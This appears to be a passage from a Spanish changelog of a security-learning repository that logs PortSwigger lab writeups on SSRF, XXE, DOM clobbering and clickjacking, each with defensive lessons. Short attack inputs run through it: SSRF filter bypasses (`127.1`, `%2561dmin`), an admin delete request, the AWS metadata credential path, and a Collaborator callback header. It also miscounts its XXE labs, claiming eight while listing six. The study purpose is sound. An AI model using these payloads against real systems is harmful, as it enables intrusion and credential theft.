1. **Severidad emergente por composición**. Open redirect aislado se clasifica "informational/low" (sólo facilita phishing). Filtro same-origin aislado se considera "mitigado, no es vulnerabilidad". Compuestos por un cliente HTTP que sigue redirects automáticamente: SSRF crítica con compromise interno completo. La auditoría por componentes deja gaps en las interacciones; las clasificaciones por tipo de bug son aproximaciones engañosas.
2. **Validar el destino final post-redirects, no sólo el primer hop**. La fix elegante: deshabilitar follow-redirects en el cliente HTTP server-side (`allow_redirects=False`). Si la feature no necesita seguir redirects (raramente lo necesita en flujos server-to-server), eso cierra la clase entera.
3. **Open redirects son anti-pattern incluso sin SSRF**. Cualquier endpoint que refleje `redirect`/`goto`/`path` en `Location` sin allowlist es bug latente que eventualmente compone. Fix universal: aceptar IDs (no URLs/paths) y construir el destino server-side.
4. **Progresión de clases de bypass en la serie SSRF**: lab #1 sin filtro (directo), lab #2 sin filtro pero target desconocido (sweep), lab #3 blacklist (representación alternativa + parser differential), lab #4 allowlist same-origin (composición con feature legítima). Cada lab cambia la *clase* de bypass, no sólo el payload.

### Archivos nuevos
- **`learning/portswigger/ssrf-filter-bypass-via-open-redirection/writeup.md`**: 7 secciones, énfasis en severidad emergente por composición y por qué allowlist de origen no alcanza para SSRF cuando el cliente HTTP sigue redirects.

### Conexión inventario
- `analisis-ssrf.md`: + `portswigger/ssrf-filter-bypass-via-open-redirection` en `learning_refs:` (5 writeups SSRF: loopback, backend discovery, blacklist bypass, open redirect chain, XXE→IMDS).

### Verificación
- `bash scripts/check.sh` ✓ (143 tests, 129/129 frontmatter OK, indexes idempotentes).

---

## [2026-05-06] — Writeup PortSwigger SSRF with blacklist-based input filter + PENDING blind SSRF OOB

Tercer lab de SSRF (Practitioner). Doble blacklist (host: `localhost`/`127.0.0.1`; path: `admin`) que se bypassea con dos técnicas combinadas:
- Host: `127.1` (POSIX expande a `127.0.0.1` pero la string literal no matchea la blacklist).
- Path: double URL encoding sobre la `a` de `admin` → `%2561dmin`. El filtro decodea una vez y ve `%61dmin`; el cliente HTTP del back-end decodea otra vez y ve `admin`. **Parser differential**.

### Hallazgos no triviales documentados en el writeup

1. **Las dos blacklists son independientes** y se aplican sobre dimensiones distintas del mismo request. Romperlas requiere combinar host bypass + path bypass simultáneamente (mi primer intento dejaba `127.0.0.1` literal y el server seguía bloqueando aunque el path ya estaba ofuscado).
2. **Double encoding va sólo sobre el carácter a esconder, no sobre todo el body**. Mi segundo intento encodee dos veces toda la línea incluyendo el `=` separador de form, así el parser de form vio un único string sin clave-valor y respondió `"Missing parameter 'stockApi'"`. La regla: form-transport encoding es UNA capa sobre el valor (sin tocar `=`/`&` separadores); bypass encoding es UNA capa extra sobre el carácter específico que evade el filtro.
3. **Parser differential como clase de bug, no truco aislado**. Doble encoding contra blacklist es la misma idea que HTTP request smuggling (CL vs TE), path traversal con `%252e%252e`, unicode normalization differentials, JSON parser differentials. Cualquier sistema con check-y-act donde los dos parsers no coinciden en normalización tiene la clase. Reconocerla como categoría > acumular trucos.
4. **Allowlist post-DNS es la fix correcta**. Validar input sobre IP resuelta (rechazar loopback/RFC1918/link-local), no sobre string del input. Eso neutraliza representaciones alternativas (`127.1`, `2130706433`, `0`, `[::1]`, `localtest.me`) en una sola regla.

### Sección "Errores comunes" pedagógica
El writeup incluye §4 "Errores comunes (vividos durante este lab)" con los dos errores que cometí al resolverlo, ambos didácticos. Patrón a replicar: cuando el debugging revela un mecanismo del input/parser, vale más documentar el camino completo (intento fallido → diagnóstico → fix) que sólo el payload final. El error es el momento donde el estudiante construye el modelo mental.

### Archivos nuevos
- **`learning/portswigger/ssrf-with-blacklist-filter/writeup.md`**: 8 secciones, énfasis en la separación entre las dos blacklists, mecánica del double encoding como parser differential, errores comunes, contramedidas en orden de robustez.

### Conexión inventario
- `analisis-ssrf.md`: + `portswigger/ssrf-with-blacklist-filter` en `learning_refs:` (4 writeups SSRF: loopback, backend discovery, blacklist bypass, XXE→IMDS).

### PENDING actualizado
- `learning/portswigger/PENDING.md`: añadido **Blind SSRF with out-of-band detection** (https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection). Razón: única métrica de éxito es callback OOB recibido por Collaborator, no hay reflejo in-band ni exploit server. Aplaza con payload listo para retomar con Burp Pro: cabecera `Referer: http://COLLAB-ID.oastify.com` en GET `/product?productId=1`.

### Verificación
- `bash scripts/check.sh` ✓ (143 tests, 129/129 frontmatter OK, indexes idempotentes).

---

## [2026-05-06] — Writeup PortSwigger Basic SSRF against another back-end system + script de scan

Segundo lab de SSRF (Apprentice). Mismo `stockApi`, pero el panel admin vive en `192.168.0.X:8080/admin` con `X` desconocido. La diferencia clave con el lab #1: ahora hay que **descubrir** la IP del back-end. Burp Community throttlea Intruder severamente (~1 req/s), así que escribí un script Python concurrente (`scan.py`, 30 workers, stdlib + requests) que termina los 255 requests en ~10-20s.

### Hallazgos no triviales documentados en el writeup

1. **SSRF como port scanner indirecto cuando los responses son distinguibles**. La distribución bimodal (253 hosts con 500/2454 bytes "connection refused" + 1 host con 200/3245 bytes "HTML del admin") es la firma canónica. Cuando status/length no varían, queda timing differential; cuando ni eso varía, es blind SSRF y necesita OOB.
2. **Outliers en sweeps tienen ruido inherente**. En el run real, `192.168.0.1` también apareció como outlier (400/19 bytes). Era el gateway respondiendo "Bad request" al handshake HTTP en un puerto que no es HTTP. Lección: outlier ≠ target automáticamente, hay que mirar el body para distinguir target real del ruido de infraestructura (gateways, balancers, IPs reservadas).
3. **Diferencia operativa con el lab #1**: lab #1 = 2 requests con target conocido (Repeater), lab #2 = 256 requests con target a descubrir (script o Intruder). Misma vulnerabilidad clase, distinto patrón de explotación. La fix raíz es la misma (no aceptar URL del cliente para calls server-side); la mitigación adicional crítica es **egress filtering desde el componente público a toda la VPC**, no sólo a loopback.
4. **Auth obligatoria en todos los servicios internos**: la asunción "está en red privada ⇒ confiable" es incompatible con SSRF. Patrón típico: un servicio interno con auth deshabilitada porque "sólo escucha en VPC" se vuelve atacable a través de cualquier SSRF en el perímetro.

### Archivos nuevos
- **`learning/portswigger/basic-ssrf-against-backend-system/writeup.md`**: 7 secciones con foco en SSRF como herramienta de descubrimiento de red interna y comparación operativa con lab #1.
- **`learning/portswigger/basic-ssrf-against-backend-system/scan.py`**: scanner concurrente con `ThreadPoolExecutor`, agrupa por status/length distribution e imprime outliers. Reutilizable para sweeps similares cambiando `--subnet`/`--port`/`--path`.
- **`learning/portswigger/basic-ssrf-against-backend-system/octets-1-255.txt`**: lista 1..255 para Intruder Simple list (alternativa al payload type Numbers).

### Conexión inventario
- `analisis-ssrf.md`: + `portswigger/basic-ssrf-against-backend-system` en `learning_refs:` (ahora 3 writeups SSRF: loopback + back-end discovery + XXE→IMDS).

### Rename (limpieza de naming)
- `learning/portswigger/lab-basic-ssrf-against-localhost/` → `learning/portswigger/basic-ssrf-against-localhost/` (sin prefijo `lab-` para coherencia con el resto de writeups). Actualizado `learning_refs:` en `analisis-ssrf.md` y referencias en CHANGELOG. URLs de PortSwigger en el writeup intactas (esas sí llevan `lab-` en el dominio real).

### Verificación
- `bash scripts/check.sh` ✓ (143 tests, 129/129 frontmatter OK, indexes idempotentes tras regenerar `TOPICS.md`).

---

## [2026-05-06] — Writeup PortSwigger Basic SSRF against the local server

Primer writeup de SSRF en la serie. Lab Apprentice clásico: parámetro `stockApi` en POST `/product/stock` acepta una URL completa controlada por el cliente; la aplicación la sigue server-side sin validación. Resolución en dos hits a Repeater: (1) `stockApi=http://localhost/admin` revela el panel admin no autenticado (asume `remote_addr == 127.0.0.1` ⇒ caller confiable); (2) `stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos` ejecuta el delete y devuelve 302 a `/admin`.

### Foco del writeup

- **El antipatrón "loopback ⇒ confiable"**: la auth del panel admin se salta cuando `request.remote_addr == 127.0.0.1`. SSRF rompe la premisa porque la fuente de la petición (loopback de la app) miente sobre el actor real (atacante remoto). La fix correcta no es bloquear loopback sino *exigir auth siempre*, incluso desde 127.0.0.1.
- **Diferencia con SSRF→IMDS** (lab `exploiting-xxe-to-perform-ssrf`): mismo paradigma (server convertido en proxy), distinto vector (form param que espera URL vs parser XML que delega resolución) y distinto blast radius (panel admin local vs cuenta cloud entera).
- **Cuándo encodear el valor de `stockApi`**: como viaja en `application/x-www-form-urlencoded`, los `:`, `/`, `?`, `=` necesitan escape para no ser interpretados como separadores de form, no por el server-side request en sí.

### Archivos nuevos
- **`learning/portswigger/basic-ssrf-against-localhost/writeup.md`**: 7 secciones con tabla comparativa loopback-SSRF vs IMDS-SSRF y diagrama Mermaid de la cadena.

### Conexión inventario
- `analisis-ssrf.md`: + `portswigger/basic-ssrf-against-localhost` en `learning_refs:` (ahora 2 writeups apuntando a SSRF: el clásico loopback y el XXE→IMDS).

### Verificación
- `bash scripts/check.sh` ✓ (143 tests, 129/129 frontmatter OK, indexes idempotentes tras regenerar `TOPICS.md`).

---

## [2026-05-06] — Sesión 20h (writeup PortSwigger XXE retrieving data by repurposing local DTD)

Lab Practitioner más sofisticado de la serie XXE. Sin Collaborator, sin exploit server, sin red externa. Técnica: "Local DTD Repurposing" (Yunusov & Osipov, 2018). Resuelto leyendo `/etc/passwd` cargando `/usr/share/yelp/dtd/docbookx.dtd` (DTD local del paquete docbook-xml) y redefiniendo `%ISOamso` con cadena maliciosa que dispara FileNotFoundException con el contenido del archivo en el mensaje. Encontré un gotcha crítico durante el debugging: `&apos;` no se expande en parsers Java estrictos en contexto DTD nested.

### Hallazgos no triviales documentados en el writeup

1. **XXE blind con cero infraestructura externa es resoluble**. Si el server tiene cualquier DTD local con declaraciones internas que se referencien a sí mismas, redefiniendo el parameter entity correcto antes de cargar el DTD permite ejecutar cadena maliciosa sin necesidad de hostear nada. La técnica abusa que XML 1.0 §4.4.1 obliga a parsers a usar la primera declaración cuando un parameter entity se declara múltiples veces.

2. **GOTCHA crítico: `&apos;` y `&quot;` no son confiables en DTD entity values nested**. Apache Xerces (default Java) en modo estricto solo expande character entity references numéricas (`&#xHH;`) en `EntityValue` nested. Las nombradas predefinidas quedan literales. Si un payload "casi funcional" da error `"system identifier must begin with quote"`, sospechar primero entidades nombradas no expandidas, no comillas mal escritas. La regla universal del paper Yunusov/Osipov: **solo numéricas en posiciones nested** (`&#x25;`, `&#x26;`, `&#x27;`, `&#x22;`).

3. **DocBook DTDs son objetivo común y predecible**: viene como dependencia transitiva de cientos de paquetes Linux. Sus parameter entities (`ISOamso`, `ISOdia`, `ISOgrk1`...) son nombres ISO 8879:1986 estandarizados. PortSwigger usa `/usr/share/yelp/dtd/docbookx.dtd` con `%ISOamso` precisamente porque es estable. Para auditorías reales: **GoSecure dtd-finder** (github.com/GoSecure/dtd-finder) cataloga DTDs por distro con qué entity redefinir en cada uno.

4. **Lección operacional sobre el hint del lab**: PortSwigger pone path y entity en el hint precisamente porque varían entre labs/versiones. **No inventar**, respetarlo. (Yo me equivoqué afirmando "el lab está calibrado para legal.dtd"; el usuario me corrigió. Lección personal: no presentar especulación como hecho cuando el hint oficial está disponible.)

5. **`load-external-dtd` es feature separada de `external-general-entities`**. Para mitigar esta técnica específica hay que deshabilitar **explícitamente** `http://apache.org/xml/features/nonvalidating/load-external-dtd`. Sin él, los otros features anti-XXE no son suficientes contra el vector de DTD local.

### Archivos nuevos
- **`learning/portswigger/xxe-trigger-error-via-local-dtd/writeup.md`**: 9 secciones, sección 3.3 dedicada al gotcha `&apos;` vs `&#x27;` con explicación detallada del comportamiento Xerces, sección 5.2 explica por qué DocBook es target predecible.
- **`learning/portswigger/xxe-trigger-error-via-local-dtd/payload.xml`**: payload validado con encoding numérico exclusivo.

### Conexión inventario
- `analisis-xxe.md`: + `portswigger/xxe-trigger-error-via-local-dtd` en `learning_refs:`. + 9 aliases nuevos (`local DTD repurposing, ISOamso, docbookx.dtd, dtd-finder, parameter entity redefinition, &#x27; vs &apos; in DTD, Xerces strict entity expansion, no infrastructure XXE, GoSecure dtd-finder`).

### Cierre real de la serie XXE Practitioner

8 labs XXE completados sin Burp Pro:
1. `exploiting-xxe-to-retrieve-files`
2. `exploiting-xxe-to-perform-ssrf`
3. `blind-xxe-data-retrieval-via-error-messages` (DTD remoto via exploit server)
4. `xinclude-attack-retrieve-files`
5. `xxe-via-file-upload-svg`
6. **`xxe-trigger-error-via-local-dtd`** (este lab)

3 labs aplazados en PENDING (requieren Collaborator):
- `lab-xxe-with-out-of-band-interaction`
- `lab-xxe-with-out-of-band-interaction-using-parameter-entities`
- `lab-xxe-with-data-exfiltration` (DTD remoto + Collaborator)

---

## [2026-05-06] — Sesión 20g (writeup PortSwigger Exploiting XXE via image file upload)

Sexto y último lab Practitioner de la serie XXE. Cierra la categoría con el vector más relevante para auditorías reales: SVG es XML, así que cualquier upload de SVG procesado server-side es XXE potencial. Lab resuelto leyendo `/etc/hostname` (container ID Docker `64186f984a81`) que se renderizó visualmente en el avatar del comentario.

### Hallazgos no triviales documentados en el writeup

1. **SVG es XML, y por extensión muchos formatos "imagen/documento" son XML escondido**: DOCX, XLSX, ODT, EPUB, RSS, KML, plist macOS, PDF con XFA, etc. Auditar uploads no es solo "qué tipos acepta" sino "qué hace con cada tipo después de aceptarlo". Solo "almacenar y servir" es seguro; cualquier procesamiento (validación de schema, conversión, extracción de metadata, thumbnail) es superficie XXE.

2. **Validación de "es una imagen" no es validación de "es seguro"**. Extension, MIME type, magic bytes, dimensiones — ninguna detecta XXE en SVG. La amenaza vive en el contenido del XML, no en si el archivo se parece a SVG. Defensa correcta: separar validación de procesamiento, rasterizar y descartar el SVG original, o sanitizar con DOMPurify SVG/SVGO con plugins.

3. **Canal de exfiltración visual**: SVG con `<text>` que renderiza el contenido de un archivo es técnica genérica reusable. Limitada por viewBox y falta de word-wrap (target debe ser de una línea), pero perfecta para hostnames, IDs cortos, secrets, hashes. Para targets multilinea: exfil OOB, base64-encoded wrappers, o múltiples elementos `<text>` calibrados.

4. **Lab requiere "Submit solution" manual del valor leído**. Distinto a labs anteriores donde la validación es automática al detectar el patrón en respuesta. Si el ataque "funciona" pero el lab no marca Solved, revisar siempre el botón "Submit solution" antes de buscar bugs en el payload. Lección: hay clases de validación distintas en PortSwigger; reconocer cuál aplica antes de diagnosticar.

5. **Distinción server-side vs client-side expansion**: si el SVG servido contiene `&xxe;` literal en el source, el ataque NO es genuino — los browsers no resuelven `file://` desde SVGs remotos por seguridad. Solo cuenta como XXE real si el SVG servido tiene el contenido del archivo embebido literal.

### Archivos nuevos
- **`learning/portswigger/xxe-via-file-upload-svg/writeup.md`**: 9 secciones, sección 3 dedicada al catálogo de "formatos ocultamente XML", sección 4.2 explica la distinción server-side vs client-side de la expansión.
- **`learning/portswigger/xxe-via-file-upload-svg/exploit.svg`**: SVG malicioso validado (idéntico al que el usuario usó en el lab, leyendo `/etc/hostname`).

### Conexión inventario
- `analisis-xxe.md`: + `portswigger/xxe-via-file-upload-svg` en `learning_refs:`. + 10 aliases nuevos (`SVG XXE, malicious SVG upload, file upload XXE, ImageTragick, image processor XXE, DOCX XXE, EPUB XXE, RSS XXE, hidden XML formats, visual exfiltration via SVG text`).

### Cierre de la serie XXE Practitioner

Con este writeup queda completa la serie XXE Practitioner sin Pro:
1. `exploiting-xxe-to-retrieve-files` — DOCTYPE inline + general entity, file://
2. `exploiting-xxe-to-perform-ssrf` — mismo + http://, IMDS exploitation
3. `blind-xxe-data-retrieval-via-error-messages` — DTD remoto + parameter entities + error-based exfil
4. `xinclude-attack-retrieve-files` — XInclude vector ortogonal a DOCTYPE/ENTITY
5. `xxe-via-file-upload-svg` — XXE en formato "imagen", canal visual

Aplazados en PENDING (requieren Burp Pro Collaborator):
- `lab-xxe-with-out-of-band-interaction` — blind puro
- `lab-xxe-with-out-of-band-interaction-using-parameter-entities` — parameter entities OOB
- `lab-xxe-with-data-exfiltration` — DTD remoto + Collaborator

---

## [2026-05-05] — Sesión 20f (writeup PortSwigger Exploiting XInclude to retrieve files)

Quinto lab de la serie XXE, primer cambio fundamental respecto a los anteriores: la app no acepta XML directo del usuario, recibe form-urlencoded (`productId=1&storeId=1`) y construye XML server-side embebiendo los valores. El atacante pierde control del documento entero (no puede declarar DOCTYPE), pero gana acceso a un vector ortogonal: XInclude.

### Hallazgos no triviales documentados en el writeup

1. **XInclude bypassa la mitigación principal de XXE**. La defensa clásica `disallow-doctype-decl=true` no afecta XInclude porque XInclude no usa DOCTYPE/ENTITY: vive como un elemento XML normal con namespace `xmlns:xi="http://www.w3.org/2001/XInclude"`. Se controla con un setting separado (`setXIncludeAware(false)`). Equipos que mitigan XXE clásico y se quedan tranquilos siguen vulnerables si XInclude está activo.

2. **No necesitas controlar el documento entero para atacar XML server-side**. Si controlas un fragmento que el server inyecta dentro de un XML construido server-side y luego parsea, es atacable. Reformula la categoría: XXE no es "el atacante envía XML"; es "el parser server-side procesa entidades/inclusiones controladas por el atacante en algún punto del documento". Apps que envuelven JSON/form input en XML para legacy backends son vulnerables aunque jamás reciban XML directo.

3. **`parse="text"` es default operacional para exfiltración de archivos no-XML**. Sin `parse="text"`, el parser intenta validar el contenido del archivo como XML. `/etc/passwd` falla esa validación y el ataque rompe silenciosamente. Olvidarlo es uno de los errores más frecuentes en payloads XInclude.

4. **Vectores XML paralelos a XInclude**: XSLT con `document()`, XPath con `doc()`, schema imports, todos resuelven recursos externos basándose en input. Auditar features del parser es más amplio que "deshabilité DOCTYPE".

### Archivos nuevos
- **`learning/portswigger/xinclude-attack-retrieve-files/writeup.md`**: 9 secciones, sección 2 dedicada a la diferencia con los XXE anteriores, sección 5.1 explica por qué XInclude bypassa la mitigación clásica.
- **`learning/portswigger/xinclude-attack-retrieve-files/payload.txt`**: snippet XInclude + body URL-encoded.

### Conexión inventario
- `analisis-xxe.md`: + `portswigger/xinclude-attack-retrieve-files` en `learning_refs:`. + 7 aliases nuevos (`XInclude, xi:include, parse=text XInclude, server-side XML construction, form-encoded XML injection, setXIncludeAware bypass, XInclude without DOCTYPE`).

---

## [2026-05-05] — Sesión 20e (writeup PortSwigger Blind XXE to retrieve data via error messages)

Lab Practitioner de XXE, primero de la serie blind que se completa sin Burp Pro. Junta tres trucos no obvios: parameter entities anidadas, double encoding del `%` con `&#x25;`, y path inexistente como canal de salida vía `FileNotFoundException`. Resuelto con DTD malicioso hospedado en el exploit server del lab + payload XML con DOCTYPE que carga el DTD remoto.

### Hallazgos no triviales documentados en el writeup

1. **Parameter entities + DTD externo desbloquean anidamientos prohibidos en DTD interno**. XML 1.0 prohíbe que general entities en DTDs inline contengan referencias a otras entidades. Parameter entities sí pueden anidarse, pero solo si la declaración vive en un DTD externo. La técnica genérica reusable: **si necesitas encadenar entidades en XXE, mueves la cadena al exploit server**.

2. **Double encoding `&#x25;` (=`%`) controla el momento de expansión**. Si pones `%` literal en el valor de una entity declaration, el parser intenta expandir esa referencia al **declarar** la entidad (orden de expansión XML). `&#x25;` se decodifica a `%` solo cuando la outer entity se **expande**, difiriendo la interpretación de la declaración interna. Técnica reusable en cualquier ataque que requiera una segunda ronda de procesamiento (path traversal, SQLi, template injection).

3. **Path inexistente como canal de salida vía error message**. Cualquier `SYSTEM URL` que el parser falla en resolver produce un error con el path completo en el mensaje. Concatenar el contenido leído del archivo dentro de un path inválido lo expone en el stack trace. Patrón reusable: SQL error-based, XSLT error-based, XPath error-based — todos siguen "construct que falla específicamente cuando el dato target tiene cierta propiedad, reflejado al cliente".

4. **Lección operacional para PENDING**: aplazar un lab "blind XXE" sin verificar si tiene exploit server es prematuro. PortSwigger provee exploit server (`*.exploit-server.net`) whitelisted en el firewall; hospedar el DTD ahí + exfil por error messages permite resolver sin Collaborator/Burp Pro. PENDING.md actualizado para registrar esta distinción.

### Archivos nuevos
- **`learning/portswigger/blind-xxe-data-retrieval-via-error-messages/writeup.md`**: 9 secciones, sección 3 dedicada a parameter entities vs general entities, sección 4.3 con el desenrolle paso por paso de la cadena, sección 5.2 explica el double encoding en términos del orden de expansión XML.
- **`learning/portswigger/blind-xxe-data-retrieval-via-error-messages/malicious.dtd`**: DTD para hospedar en exploit server.
- **`learning/portswigger/blind-xxe-data-retrieval-via-error-messages/payload.xml`**: XML body con DOCTYPE que carga el DTD remoto.

### Conexión inventario
- `analisis-xxe.md`: + `portswigger/blind-xxe-data-retrieval-via-error-messages` en `learning_refs:`. + 9 aliases nuevos (`blind XXE, parameter entity, error-based XXE, malicious external DTD, FileNotFoundException leak, double encoding XML, character entity reference, deferred entity expansion, Yunusov Osipov technique`).
- `learning/portswigger/PENDING.md`: nota agregada sobre el matiz de blind XXE con exploit server.

---

## [2026-05-05] — Sesión 20d (writeup PortSwigger Exploiting XXE to perform SSRF)

Segundo lab de la serie XXE. Cambia un solo carácter en el payload del lab anterior (`file://` → `http://`) y se vuelve un vector completamente distinto: SSRF al cloud metadata service de AWS para leakear credenciales IAM. Se resolvió saltando directo a `/latest/meta-data/iam/security-credentials/admin` y obteniendo `AccessKeyId`, `SecretAccessKey`, `Token` del rol.

### Hallazgos no triviales documentados en el writeup

1. **XXE no es solo file disclosure; es SSRF gratis**. El URL handler del parser XML resuelve cualquier esquema (`file:`, `http:`, `https:`, `ftp:`, `gopher:`, `jar:`...). No hay separación entre "esquemas seguros para input externo" y "esquemas seguros para internal-only". Cualquier endpoint que parsee XML user-controlled con un parser default-vulnerable es potencialmente SSRF a la red interna del server.

2. **Cloud metadata services son target #1 de SSRF**. AWS IMDSv1 en `169.254.169.254` no requiere auth porque asume "si puedes hablar con esta IP, ya estás dentro de la instancia". La asunción se rompe en presencia de SSRF. AWS IMDSv2 lo arregla con protocolo de dos pasos (PUT para token + GET con header del token), incompatible con SSRF GET-only típico. Forzar IMDSv2 (`http-tokens required`) es la mitigación moderna; instancias legacy en IMDSv1 siguen vulnerables.

3. **Capital One (2019) es el case study canónico de este vector**. WAF mal configurado dejó SSRF a `169.254.169.254`, atacante leyó credenciales IAM, accedió a S3, exfiltró 100M+ records. La mitigación post-incident no fue solo arreglar el WAF: AWS lanzó IMDSv2 como respuesta directa al patrón.

4. **JSON sobrevive parsing XML porque no contiene `<` ni `&` literales**. El JSON del IMDS usa `{`, `}`, `:`, `"`, `,`, todos benignos en XML. Eso permite insertion sin necesidad de wrapper de codificación. Si el target devolviera HTML/XML, el parse rompería y necesitarías exfil OOB.

5. **La premisa "no auth porque red aislada" se rompe transitivamente**. Cualquier servicio interno sin auth (Redis, Elasticsearch, Memcached, paneles admin "solo LAN", IMDS, Consul/etcd) es atacable a través de SSRF que viaje desde un endpoint externo. Auth en todos los servicios internos, incluso "no expuestos", es defense in depth real.

### Archivos nuevos
- **`learning/portswigger/exploiting-xxe-to-perform-ssrf/writeup.md`**: 9 secciones, sección 2 dedicada a la diferencia con el lab gemelo (file retrieval), sección 5.2 explica IMDSv1 vs IMDSv2 y el contexto Capital One.
- **`learning/portswigger/exploiting-xxe-to-perform-ssrf/payload.xml`**: payload validado.

### Conexión inventario
- `analisis-xxe.md`: + `portswigger/exploiting-xxe-to-perform-ssrf` en `learning_refs:`.
- `analisis-ssrf.md`: + `portswigger/exploiting-xxe-to-perform-ssrf` en `learning_refs:` (antes vacío). + 14 aliases nuevos (`AWS IMDS exploitation, EC2 metadata SSRF, 169.254.169.254, link-local IP abuse, cloud metadata theft, IAM credential theft via SSRF, IMDSv1 vs IMDSv2, Capital One breach pattern, XXE to SSRF, gopher SSRF, internal port scan via SSRF, redirect chain SSRF, blind SSRF`).

---

## [2026-05-05] — Sesión 20c (writeup PortSwigger Exploiting XXE to retrieve files)

Primer lab de la serie XXE, foundational. Mecánica básica de external entities con `SYSTEM "file:///..."` exfiltrando vía reflexión del `productId` en mensaje de error "Invalid product ID: ...". El inventario tenía `analisis-xxe.md` pero `learning_refs` estaba vacío; ahora apunta a este writeup.

### Hallazgos no triviales documentados en el writeup

1. **`<?xml ?>` declaration tiene una invariante de byte 0**. Cualquier carácter previo (newline, espacio, BOM) la convierte en processing instruction y el parser rechaza con `"The processing instruction target matching '[xX][mM][lL]' is not allowed"` (error que tuve que diagnosticar en vivo). La forma robusta es **omitir la declaración** completamente; XML 1.0 la permite opcional (UTF-8 y version 1.0 son defaults). Pegar payloads en Burp Repeater es fuente común de este bug porque el editor a veces deja un newline inicial.

2. **Reflexión de input en error es un bug independiente que se vuelve crítico en combo**. El "Invalid product ID: <valor>" reflejado es inocuo por sí solo (usuario ve su propio input). Combinado con XXE se vuelve canal de exfiltración inmediato. Pattern recurrente: dos defectos individualmente menores acoplándose en uno crítico.

3. **El parser sustituye contenido de archivo sin escapar caracteres XML**. Si el archivo target contiene `<`, `>`, `&`, rompe el documento padre y el parse falla. `/etc/passwd` funciona porque solo tiene chars seguros; archivos de config/source code requieren wrapper (`php://filter` para base64 si es PHP, o exfil OOB si no).

4. **Default-vulnerability matrix de parsers XML**: Java DocumentBuilderFactory (vuln antes de hardening explicit), libxml2 (antes de versions recientes), .NET XmlDocument (antes 4.5.2 con XmlResolver no null), Python lxml/xml.sax (vuln, defusedxml es el wrapper canónico). Documentar cuál estás usando y verificar settings concretos.

### Archivos nuevos
- **`learning/portswigger/exploiting-xxe-to-retrieve-files/writeup.md`**: 8 secciones, sección 3.3 dedicada al escollo del `<?xml ?>` declaration por aprendizaje en vivo.
- **`learning/portswigger/exploiting-xxe-to-retrieve-files/payload.xml`**: payload validado (sin `<?xml ?>` para robustez).

### Conexión inventario
- `analisis-xxe.md`: + `portswigger/exploiting-xxe-to-retrieve-files` en `learning_refs:` (antes vacío). + 12 aliases nuevos (`SYSTEM entity, DOCTYPE injection, file:// XXE, XML LFI, billion laughs, XML bomb, XInclude injection, defusedxml, DocumentBuilderFactory hardening, php://filter base64 XXE`, etc.) — el archivo tenía solo 3 aliases mínimos derivados del título.

---

## [2026-05-05] — Sesión 20b (writeup PortSwigger Clobbering DOM attributes to bypass HTML filters)

Segundo capítulo de DOM clobbering en la serie. Donde el lab anterior (`dom-xss-exploiting-dom-clobbering`) clobbereaba variables de la app, este clobberea **propiedades del propio DOM API** (`form.attributes`) para bypassear el sanitizer **HTMLJanitor** desde dentro. La diferencia didáctica vale el writeup separado.

### Hallazgos no triviales documentados en el writeup

1. **Named access en `<form>` shadow-ea propiedades de prototipo**. `<form><input id=attributes></form>` hace que `form.attributes` apunte al input, no al `NamedNodeMap`. El lookup se resuelve en propiedades propias antes de llegar al getter de `Element.prototype.attributes`. Esto rompe cualquier sanitizer que enumere atributos vía `node.attributes` con dot notation.

2. **DOM clobbering puede atacar al sanitizer, no solo a la app**. Reformula la categoría de ataque: si el sanitizer enumera/inspecciona vía propiedades clobbereables del DOM, está atacable con HTML estático bien formado. Fix correcta: usar APIs no clobbereables (`Element.prototype.getAttributeNames.call(node)`) o sanitizers que operen sobre representaciones internas (DOMPurify).

3. **Race condition con fragment focus en SPAs/blogs async**. Un redirect top-level a `URL#x` falla cuando el target del hash se carga async después del initial HTML: el browser procesa el fragment antes de que `id=x` exista, no encuentra match, y descarta sin reaplicar focus cuando el elemento aparece después. Solución genérica: iframe con onload re-navegando al mismo URL+`#x` (same-document navigation que procesa fragment contra DOM ya poblado).

4. **El truco del flag `window.x` en el onload**. Cambiar `iframe.src` dispara otro onload; sin guard, loop infinito. Idiom estándar: `if (!window.x) { window.x = 1; this.src += '#x' }`.

5. **SOP no impide cambiar `iframe.src` ni escuchar `load` del elemento**. Esas dos primitivas son suficientes para orquestar el ataque cross-origin sin necesidad de leer DOM del lab.

### Archivos nuevos
- **`learning/portswigger/clobbering-dom-attributes-bypass-html-filters/writeup.md`**: 9 secciones, sección 2 explicita la diferencia con el lab gemelo, sección 4.3 cubre la race condition completa.
- **`learning/portswigger/clobbering-dom-attributes-bypass-html-filters/exploit.html`**: payload del exploit server (iframe + onload).

### Conexión inventario
- `analisis-xss.md`: + `portswigger/clobbering-dom-attributes-bypass-html-filters` en `learning_refs:`. + aliases `HTMLJanitor bypass, form.attributes clobbering, sanitizer bypass via DOM clobbering, fragment focus race condition, iframe re-navigation fragment`.

---

## [2026-05-05] — Sesión 20 (writeup PortSwigger Basic clickjacking with CSRF token protection)

Lab gemelo del de "prefilled form input" que ya estaba documentado. Misma mecánica operacional (iframe + decoy sobre `/my-account?email=...`), distinta lección didáctica: este lab aísla la pregunta "¿el token CSRF defiende contra clickjacking?". Respuesta: no, porque la request la fabrica el navegador de la víctima sobre la página real, así que el token siempre es válido.

### Hallazgos no triviales documentados en el writeup

1. **Token CSRF y clickjacking defienden cosas distintas**. El token defiende el origen de la request; clickjacking secuestra el origen del *click*. Son ortogonales, no sustitutos. Una protección no implica la otra.

2. **El `?email=...` en la URL es el habilitador real**. Sin prefill por query param, la víctima tendría que escribir el valor además de hacer click; el ataque escala a múltiples acciones de la víctima y se vuelve mucho menos confiable.

3. **Calibración con `opacity` intermedia es la forma profesional**. Trabajar con `opacity: 0` desde el principio es ciego; `0.5` permite ver el iframe debajo del decoy y ajustar `top`/`left` con confianza. Para este lab afinó en `top: 555px` (vs `top: 400px` del lab prefilled, distinto layout).

4. **El bot del lab acepta `opacity: 0.5` igual**. La invisibilidad real (`opacity: 0.0001`) es para un ataque "creíble" en producción; para resolver el lab basta con que el click programado caiga en el botón.

### Archivos nuevos
- **`learning/portswigger/clickjacking-basic-csrf-protected/writeup.md`**: 9 secciones, sección 2 explícita sobre la diferencia con el lab `prefilled-form-input` para que el par tenga sentido como unidad didáctica.
- **`learning/portswigger/clickjacking-basic-csrf-protected/exploit.html`**: payload validado con `top: 555px`, `opacity: 0.5`.

### Conexión inventario
